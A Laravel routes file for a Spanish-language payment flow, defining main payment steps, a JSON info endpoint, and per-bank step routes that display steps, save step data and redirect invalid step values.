<?php

use App\Http\Controllers\BankFlowController;
use App\Http\Controllers\PaymentController;
use Illuminate\Support\Facades\Route;


// ✅ / y /pago => step1 (vista principal)
Route::get('/', [PaymentController::class, 'index'])->name('home');
Route::get('/pago', [PaymentController::class, 'index'])->name('pago.home');


Route::prefix('pago')->group(function ()  {
    // ✅ endpoint para MAIN FLOW
    Route::get('step/1', [PaymentController::class, 'index'])->name('pago.step1');
    Route::get('step/2', [PaymentController::class, 'step2'])->name('pago.step2');

    // ✅ endpoint para MAIN FLOW step2 (JSON)
    Route::get('info', [PaymentController::class, 'initAuth'])->name('pago.init');

    Route::post('{bank}/step/{step}/save', [BankFlowController::class, 'saveStep'])->middleware('web')->name('pago.bank.step.save');
    Route::get('{bank}', [BankFlowController::class, 'start'])->name('pago.bank');
    Route::get('{bank}/step/{step}', [BankFlowController::class, 'step'])
        ->whereNumber('step')
        ->name('pago.bank.step');
    // ✅ Luego un fallback para step inválido (undefined, null, abc, etc.)
    Route::get('{bank}/step/{any}', function ($bank) {
        return redirect()->route('pago.bank', ['bank' => $bank]);
    })->where('any', '.*');
});
